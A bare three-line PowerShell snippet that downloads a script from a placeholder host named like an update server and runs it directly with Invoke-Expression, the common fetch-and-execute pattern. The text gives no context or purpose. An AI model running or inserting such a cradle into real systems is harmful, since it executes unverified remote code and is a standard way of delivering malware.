$client = New-Object System.Net.WebClient
$text = $client.DownloadString('https://updates.example.org/script.ps1')
Invoke-Expression $text
